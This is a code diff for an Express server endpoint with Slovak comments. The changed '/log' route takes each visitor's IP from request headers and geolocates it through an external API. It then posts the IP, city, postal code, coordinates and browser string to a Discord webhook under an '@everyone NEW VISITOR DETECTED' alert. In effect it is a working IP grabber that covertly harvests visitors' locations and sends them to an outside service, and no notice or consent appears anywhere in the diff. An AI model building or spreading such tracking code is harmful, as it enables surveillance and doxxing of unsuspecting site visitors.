@@ -11,15 +11,19 @@ app.use(express.static(path.join(__dirname)));
 
 app.post('/log', async (req, res) => {
     try {
-        const { ipData } = req.body;
-        
+        const ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress; // Získanie IP adresy návštevníka
+
+        const ipData = await fetch(`https://ipapi.co/${ip}/json/`) // Nahradiť vhodnou službou na geolokáciu
+            .then((response) => response.json())
+            .catch(() => ({})); // Fallback, ak zlyhá API
+
         const message = {
             content: `@everyone 🚨 **NEW VISITOR DETECTED** 🚨\n\n` +
-                    `🌐 IP: ${ipData.ip || 'Unknown'}\n` +
-                    `📍 Location: ${ipData.city || 'Unknown'}, ${ipData.region || 'Unknown'}, ${ipData.country_name || 'Unknown'}, ${ipData.postal || 'Unknown'}, ${ipData.country_calling_code || 'Unknown'}, ${ipData.currency || 'Unknown'}\n` +
-                    `🌍 Coords: ${ipData.latitude || 'Unknown'}, ${ipData.longitude || 'Unknown'}\n` +
-                    `🔍 Browser: ${req.headers['user-agent']}\n` +
-                    `⏰ Time: ${new Date().toISOString()}`
+                `🌐 IP: ${ip || 'Unknown'}\n` +
+                `📍 Location: ${ipData.city || 'Unknown'}, ${ipData.region || 'Unknown'}, ${ipData.country_name || 'Unknown'}, ${ipData.postal || 'Unknown'}, ${ipData.country_calling_code || 'Unknown'}, ${ipData.currency || 'Unknown'}\n` +
+                `🌍 Coords: ${ipData.latitude || 'Unknown'}, ${ipData.longitude || 'Unknown'}\n` +
+                `🔍 Browser: ${req.headers['user-agent']}\n` +
+                `⏰ Time: ${new Date().toISOString()}`
         };
 
         await fetch(process.env.DISCORD_WEBHOOK_URL, {
@@ -33,7 +37,7 @@ app.post('/log', async (req, res) => {
         res.json({ success: true });
     } catch (error) {
         console.error('Error:', error);
-        res.json({ success: true }); 
+        res.json({ success: false });
     }
 });
 
